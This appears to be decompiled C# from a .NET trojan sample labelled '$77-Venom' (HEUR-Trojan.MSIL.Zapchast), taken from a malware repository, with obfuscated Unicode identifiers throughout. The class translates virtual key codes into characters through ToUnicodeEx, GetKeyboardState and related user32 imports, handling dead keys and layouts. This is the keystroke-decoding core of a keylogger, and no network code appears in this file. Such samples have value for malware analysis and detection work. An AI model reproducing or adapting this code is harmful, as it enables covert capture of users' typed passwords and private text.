// Decompiled with JetBrains decompiler
// Type: Ἱ꣹�Ᵹꧼ諿㛽┪컪�ᐶ焯瀂ᅁ膫ᛴ꾮㍚婆
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\HEUR-Trojan.MSIL.Zapchast.gen-defbae45ea8e71f8a50123f382f4538afc9db836de09bab316464d4793394f19.exe

using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

internal static class Ἱ\uA8F9\uFFFDꝽꧼ諿㛽\u252A컪\uFFFD\uF26Eᐶ焯瀂ᅁ膫ᛴ꾮\u335A婆
{
  public const byte ᗘ\uECDFｰᨘ兆\uFFFD玌\uFFFD\uFFFD肟룑鑪轿\uFFFDᠳ㞷땪燐䍢졕 = 16;
  public const byte \uF171ﭮ爐뺄䢁᧘\uFFFD旅\uE42C隆숌\uFFFD匕\uE822彆\u2AD8誟䡨\uF4C4偽 = 20;
  public const byte 稜凍\uE75EⰆ\uE5BC럿勆饔엉饰엶䰵\uFFFD낑㵍茑ഒ窸庁褌 = 144;
  public const byte 屴艇㓶Ṗ䒒︈ケ帐\u25A9륲늞\u2962\uEEC3캹塧碳沣\u2ECA拦怣 = 160;
  public const byte 쐚쫺\uEAA2ℏ㝡鑹폄캴ٷ\uE003ꂅ屒쵟椵萀ʊ쐓ྼͻ岊 = 161;
  public const byte \u29C2꤈\u2829㽉땣퍵\u2F72ኗ兿莃\u1C80紙妆ﾬ舻슴址뻿侓䇜 = 162;
  public const byte 酙㥹ꊁ\uFFFD쀆믃壻趞ވ䠵퀵㳠ᡄ칠\uFFFD놜ᦕ䦘\u3230\u2015 = 163;
  public const byte 텤\uFFFD\uE916㘃\uEFFB礄\uE9AFൈ䐂怶闈\u269B\uE229萝糸靉婅\uEBE3\uEB39䕷 = 164;
  public const byte 時ᆜน넘촭㢥\u2F06网꼠\uFDD4귄ᾛ಼ἦ\uF5B2穸貗毖侱댋 = 165;
  public const byte \uFFFD㐸쌹\u322F\uE6B9栯髗ဥ옩눟薷㨦㡰횰\uE8BC\uE08E唰䈔㝲漂 = 91;
  public const byte ꖡ봰䆾坩砿䁡\u089D溬ꠢ톣섆ቿ晪틗\u1364䦢㩣\uAB1E\u0A63即 = 92;
  public const byte 鄣臣ꉘꇣ麫\u2503ᐿ䁆ܸ匉퇺侃糜ꋓꍨ킔\u2E62ᷤ\uA87A룅 = 145;
  public const byte 烱\uF65C徝扖떸\uF04Fﴇ䕠礖䓶\uE9C1櫟\uFFFD铄庞\u312F\uE7B7\uE11F\u0AFE剳 = 45;
  public const byte \u299A풀罛삭헠혨\u241E쨊笋ꦬＢ䆀\uFFFD㹲䫭雫鈿뫷촉愽 = 17;
  public const byte ᑝ頠ᣕ\uFFFDڻᜢ\u2A8D氣\u0001쯰墚닚\uE7ED嗀췤槦ẻက阰\uF5D4 = 18;
  public const byte 帕\uFFFDⳛ燊\uF761邏ࢫ\u1CBD倡묊\uFFFD邧땳緺斁旡롪क़鴝騢 = 231;
  private static int 㑙אּ礓\uFFFD륵塭\u4DCB\uE766で㪣ሃਨㅠ႔\uE0EA\u287C研謈샢ቢ = 0;
  private static int 䨧Ⴊ쪞\uE55C涆ᒜ䯭㴛픕垕뢨탰\u312F㺠ᗽ\u083D对\u2873̋ꎊ = 0;
  private static byte[] 澜궼钁䱐擱\uF615뗮ⴃ耨豫㼸\uE20D\uEF8F懶\uF236㤀\uEAB7皳꿬츒 = new byte[256];
  private static bool \u2A49뉀铍\u2FDEⱬﺪ釞\uE7D2䎗㥺\u2101\u2E33灹\u2F3Aࠖᇏ\uFFFDꄗ븻\u2808 = false;

  internal static void ﴊ霧ẳ煂\u0DC9霥嫺ꆇ逑즼\uEE10쬠諎溵ꄐ뷤杉ꈾ\u0C8D蓝(
    int virtualKeyCode,
    int fuState,
    out char[] chars)
  {
    IntPtr dwhkl = Ἱ\uA8F9\uFFFDꝽꧼ諿㛽\u252A컪\uFFFD\uF26Eᐶ焯瀂ᅁ膫ᛴ꾮\u335A婆.Ꮾ쀅䥦ΐ挾ﴌ\uE1FB䁚\uE684퓷쇉㓇䂣䝾祐\uE634匞ꆹ홤憞();
    int scanCode = Ἱ\uA8F9\uFFFDꝽꧼ諿㛽\u252A컪\uFFFD\uF26Eᐶ焯瀂ᅁ膫ᛴ꾮\u335A婆.\u21DD蔌\u225B裊寧䄧摋헀舋뼊\u29B5卆貁睸\u02F0虇痁溏\uF0DD铰(virtualKeyCode, 0, dwhkl);
    Ἱ\uA8F9\uFFFDꝽꧼ諿㛽\u252A컪\uFFFD\uF26Eᐶ焯瀂ᅁ膫ᛴ꾮\u335A婆.蘓\uFDE6\uEA88褁䬋鮾퍩澽잮ဢ쓳ㅗܜ\uE593頵械ꄊᄔ\uE589赒(virtualKeyCode, scanCode, fuState, dwhkl, out chars);
  }

  internal static void \u0FF7\uF16E\u0CFC擛㖻\u32CE\u17FD婽苛볪䞃輊騍門䩠ᜭ骱䩁줃鳉(
    int virtualKeyCode,
    int scanCode,
    int fuState,
    out char[] chars)
  {
    IntPtr dwhkl = Ἱ\uA8F9\uFFFDꝽꧼ諿㛽\u252A컪\uFFFD\uF26Eᐶ焯瀂ᅁ膫ᛴ꾮\u335A婆.Ꮾ쀅䥦ΐ挾ﴌ\uE1FB䁚\uE684퓷쇉㓇䂣䝾祐\uE634匞ꆹ홤憞();
    Ἱ\uA8F9\uFFFDꝽꧼ諿㛽\u252A컪\uFFFD\uF26Eᐶ焯瀂ᅁ膫ᛴ꾮\u335A婆.蘓\uFDE6\uEA88褁䬋鮾퍩澽잮ဢ쓳ㅗܜ\uE593頵械ꄊᄔ\uE589赒(virtualKeyCode, scanCode, fuState, dwhkl, out chars);
  }

  internal static void 蘓\uFDE6\uEA88褁䬋鮾퍩澽잮ဢ쓳ㅗܜ\uE593頵械ꄊᄔ\uE589赒(
    int virtualKeyCode,
    int scanCode,
    int fuState,
    IntPtr dwhkl,
    out char[] chars)
  {
    StringBuilder pwszBuff1 = new StringBuilder(64);
    㑒\u1F5A뜧冕\u27D5㿢맱녲\u2FB4\uE3BD\u1C81锚\uEE0C쾘蘽\uF69CჂ\uECAA\u27A5뭫 㑒뜧冕㿢맱녲锚쾘蘽Ⴢ뭫 = 㑒\u1F5A뜧冕\u27D5㿢맱녲\u2FB4\uE3BD\u1C81锚\uEE0C쾘蘽\uF69CჂ\uECAA\u27A5뭫.\u274Aध㸥\u2F06鈲鐴ꖁ舾ᯔ\u2B42䂝慫倇\u0BE0矴뒸䟳卟鏚ઍ();
    byte[] lpKeyState = 㑒뜧冕㿢맱녲锚쾘蘽Ⴢ뭫.\u325E\u28A0ꊡ䈕禹홭晚㔊揙敃悧骲洿䂄ậ䆴鱋ᮇ\uA70A蝶();
    bool flag = false;
    if (㑒뜧冕㿢맱녲锚쾘蘽Ⴢ뭫.掣䱠俟\u1776凸ꤥ衹ꀊ糊刉ભ靋Ổ㟯驩㕒铼\u2991\u2533Ƹ(Keys.ShiftKey))
      lpKeyState[16] = (byte) 128;
    if (㑒뜧冕㿢맱녲锚쾘蘽Ⴢ뭫.菖\uFDD3㩽ꇓ槡岖禎똤ᕒᇙ\u2AF3ഖ䢚搋ꤞ统ꗚ餦\uFFFD栳(Keys.Capital))
      lpKeyState[20] = (byte) 1;
    switch (Ἱ\uA8F9\uFFFDꝽꧼ諿㛽\u252A컪\uFFFD\uF26Eᐶ焯瀂ᅁ膫ᛴ꾮\u335A婆.뉻叁\u1F7F蓕툻笺赥睝\uE3AA倉왆ጺ\u325B\u2F1Aꢖ뉼\uF45Eℙ\uF702殶(virtualKeyCode, scanCode, lpKeyState, pwszBuff1, pwszBuff1.Capacity, fuState, dwhkl))
    {
      case -1:
        flag = true;
        Ἱ\uA8F9\uFFFDꝽꧼ諿㛽\u252A컪\uFFFD\uF26Eᐶ焯瀂ᅁ膫ᛴ꾮\u335A婆.\u271E\u3390इ碔掅꼃Ʞ\uFFFD翦흌慨\uF319컹ꫬ닪嵙긱㥞怈ꯘ(virtualKeyCode, scanCode, dwhkl);
        chars = (char[]) null;
        break;
      case 0:
        chars = (char[]) null;
        break;
      case 1:
        if (pwszBuff1.Length > 0)
        {
          chars = new char[1]{ pwszBuff1[0] };
          break;
        }
        chars = (char[]) null;
        break;
      default:
        if (pwszBuff1.Length > 1)
        {
          chars = new char[2]{ pwszBuff1[0], pwszBuff1[1] };
          break;
        }
        chars = new char[1]{ pwszBuff1[0] };
        break;
    }
    if (Ἱ\uA8F9\uFFFDꝽꧼ諿㛽\u252A컪\uFFFD\uF26Eᐶ焯瀂ᅁ膫ᛴ꾮\u335A婆.㑙אּ礓\uFFFD륵塭\u4DCB\uE766で㪣ሃਨㅠ႔\uE0EA\u287C研謈샢ቢ != 0 && Ἱ\uA8F9\uFFFDꝽꧼ諿㛽\u252A컪\uFFFD\uF26Eᐶ焯瀂ᅁ膫ᛴ꾮\u335A婆.\u2A49뉀铍\u2FDEⱬﺪ釞\uE7D2䎗㥺\u2101\u2E33灹\u2F3Aࠖᇏ\uFFFDꄗ븻\u2808)
    {
      if (chars == null)
        return;
      StringBuilder pwszBuff2 = new StringBuilder(5);
      Ἱ\uA8F9\uFFFDꝽꧼ諿㛽\u252A컪\uFFFD\uF26Eᐶ焯瀂ᅁ膫ᛴ꾮\u335A婆.뉻叁\u1F7F蓕툻笺赥睝\uE3AA倉왆ጺ\u325B\u2F1Aꢖ뉼\uF45Eℙ\uF702殶(Ἱ\uA8F9\uFFFDꝽꧼ諿㛽\u252A컪\uFFFD\uF26Eᐶ焯瀂ᅁ膫ᛴ꾮\u335A婆.㑙אּ礓\uFFFD륵塭\u4DCB\uE766で㪣ሃਨㅠ႔\uE0EA\u287C研謈샢ቢ, Ἱ\uA8F9\uFFFDꝽꧼ諿㛽\u252A컪\uFFFD\uF26Eᐶ焯瀂ᅁ膫ᛴ꾮\u335A婆.䨧Ⴊ쪞\uE55C涆ᒜ䯭㴛픕垕뢨탰\u312F㺠ᗽ\u083D对\u2873̋ꎊ, Ἱ\uA8F9\uFFFDꝽꧼ諿㛽\u252A컪\uFFFD\uF26Eᐶ焯瀂ᅁ膫ᛴ꾮\u335A婆.澜궼钁䱐擱\uF615뗮ⴃ耨豫㼸\uE20D\uEF8F懶\uF236㤀\uEAB7皳꿬츒, pwszBuff2, pwszBuff2.Capacity, 0, dwhkl);
      Ἱ\uA8F9\uFFFDꝽꧼ諿㛽\u252A컪\uFFFD\uF26Eᐶ焯瀂ᅁ膫ᛴ꾮\u335A婆.\u2A49뉀铍\u2FDEⱬﺪ釞\uE7D2䎗㥺\u2101\u2E33灹\u2F3Aࠖᇏ\uFFFDꄗ븻\u2808 = false;
      Ἱ\uA8F9\uFFFDꝽꧼ諿㛽\u252A컪\uFFFD\uF26Eᐶ焯瀂ᅁ膫ᛴ꾮\u335A婆.㑙אּ礓\uFFFD륵塭\u4DCB\uE766で㪣ሃਨㅠ႔\uE0EA\u287C研謈샢ቢ = 0;
    }
    else
    {
      Ἱ\uA8F9\uFFFDꝽꧼ諿㛽\u252A컪\uFFFD\uF26Eᐶ焯瀂ᅁ膫ᛴ꾮\u335A婆.䨧Ⴊ쪞\uE55C涆ᒜ䯭㴛픕垕뢨탰\u312F㺠ᗽ\u083D对\u2873̋ꎊ = scanCode;
      Ἱ\uA8F9\uFFFDꝽꧼ諿㛽\u252A컪\uFFFD\uF26Eᐶ焯瀂ᅁ膫ᛴ꾮\u335A婆.㑙אּ礓\uFFFD륵塭\u4DCB\uE766で㪣ሃਨㅠ႔\uE0EA\u287C研謈샢ቢ = virtualKeyCode;
      Ἱ\uA8F9\uFFFDꝽꧼ諿㛽\u252A컪\uFFFD\uF26Eᐶ焯瀂ᅁ膫ᛴ꾮\u335A婆.\u2A49뉀铍\u2FDEⱬﺪ釞\uE7D2䎗㥺\u2101\u2E33灹\u2F3Aࠖᇏ\uFFFDꄗ븻\u2808 = flag;
      Ἱ\uA8F9\uFFFDꝽꧼ諿㛽\u252A컪\uFFFD\uF26Eᐶ焯瀂ᅁ膫ᛴ꾮\u335A婆.澜궼钁䱐擱\uF615뗮ⴃ耨豫㼸\uE20D\uEF8F懶\uF236㤀\uEAB7皳꿬츒 = (byte[]) lpKeyState.Clone();
    }
  }

  private static void \u271E\u3390इ碔掅꼃Ʞ\uFFFD翦흌慨\uF319컹ꫬ닪嵙긱㥞怈ꯘ(int vk, int sc, IntPtr hkl)
  {
    StringBuilder pwszBuff = new StringBuilder(10);
    byte[] lpKeyState;
    do
    {
      lpKeyState = new byte[(int) byte.MaxValue];
    }
    while (Ἱ\uA8F9\uFFFDꝽꧼ諿㛽\u252A컪\uFFFD\uF26Eᐶ焯瀂ᅁ膫ᛴ꾮\u335A婆.뉻叁\u1F7F蓕툻笺赥睝\uE3AA倉왆ጺ\u325B\u2F1Aꢖ뉼\uF45Eℙ\uF702殶(vk, sc, lpKeyState, pwszBuff, pwszBuff.Capacity, 0, hkl) < 0);
  }

  private static IntPtr Ꮾ쀅䥦ΐ挾ﴌ\uE1FB䁚\uE684퓷쇉㓇䂣䝾祐\uE634匞ꆹ홤憞() => Ἱ\uA8F9\uFFFDꝽꧼ諿㛽\u252A컪\uFFFD\uF26Eᐶ焯瀂ᅁ膫ᛴ꾮\u335A婆.㠘䅟枕㔺䭑\uEC8Dꦭ뤝\u0F10箈齒ⰴ浢䨛붕\uE270蝉멕̓䧍(鈃嶼ࡋ\u2D69\uFFFD֯\u003E붓隍懞즱ꌨ뽌嬌㽬\u2361\u2B9E擮າࠐ.冣偔鋶淂諡㓁ꑫ쐥\uEAEA趎纇ꑷ악撂㧆鳀\uE592ੑ\uF0EF房(鈃嶼ࡋ\u2D69\uFFFD֯\u003E붓隍懞즱ꌨ뽌嬌㽬\u2361\u2B9E擮າࠐ.匕\u0AA9裇\uEB13殔칡튳珈\u0C49㼬㝘鴑拱鍅힍쁷෯\u33C3霂좁(), out int _));

  [Obsolete("Use ToUnicodeEx instead")]
  [DllImport("user32.dll")]
  public static extern int ToAscii(
    int uVirtKey,
    int uScanCode,
    byte[] lpbKeyState,
    byte[] lpwTransKey,
    int fuState);

  [DllImport("user32.dll", EntryPoint = "ToUnicodeEx")]
  public static extern int 뉻叁\u1F7F蓕툻笺赥睝\uE3AA倉왆ጺ\u325B\u2F1Aꢖ뉼\uF45Eℙ\uF702殶(
    int wVirtKey,
    int wScanCode,
    byte[] lpKeyState,
    [MarshalAs(UnmanagedType.LPWStr), Out] StringBuilder pwszBuff,
    int cchBuff,
    int wFlags,
    IntPtr dwhkl);

  [DllImport("user32.dll", EntryPoint = "GetKeyboardState")]
  public static extern int 聱㯘ٖ嬚㰨\u2726ꤪ\u32EB㾓\u2FD0\uE881ȶᬙ뗴끉\u0B74雍찋ዴ\uF04A(byte[] pbKeyState);

  [DllImport("user32.dll", EntryPoint = "GetKeyState", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
  public static extern short Ꮯ뜚妠酈\uF74B声鸀㰁\u23A4젏䥽쏠Ꝙ\u33BA甿㤙㽋\uF8DF嵝я(int vKey);

  [DllImport("user32.dll", EntryPoint = "MapVirtualKeyEx", CharSet = CharSet.Auto)]
  internal static extern int \u21DD蔌\u225B裊寧䄧摋헀舋뼊\u29B5卆貁睸\u02F0虇痁溏\uF0DD铰(
    int uCode,
    int uMapType,
    IntPtr dwhkl);

  [DllImport("user32.dll", EntryPoint = "GetKeyboardLayout", CharSet = CharSet.Auto)]
  internal static extern IntPtr 㠘䅟枕㔺䭑\uEC8Dꦭ뤝\u0F10箈齒ⰴ浢䨛붕\uE270蝉멕̓䧍(int dwLayout);

  internal enum \uFFFDꦓᇚ위\uE555理酐챿嶮\uFFFD罳鉕\uFFFD\uF536\u2073餭梇ꮦ\uEF0D\uE8B3
  {
    \u2A04ꃸꚍ䊸穈\uE010얕鄾ᩝ蝘颉\u0081ꬓॐ뭌\uECDCญ仓嚈Ɜ,
    \u19EB㯋빚繑ẜ\uE769엏뙕\uE8D0\u2118㟷\u32CB鮰倱긠䰼嚍в열뇕,
    㜟ᥒ烠\u4DF5ꝇ촰\u10C8鄴\u3332嘨摘춑윌㤳ሀ覆ﬖ\u3293阽骤,
    \u29F1甴Ꭱ\uE7B0苋ኳ躤\uF400魴葲掱㮓挛哸ⳅ횼黐뵍䤆\uFFFD,
  }
}
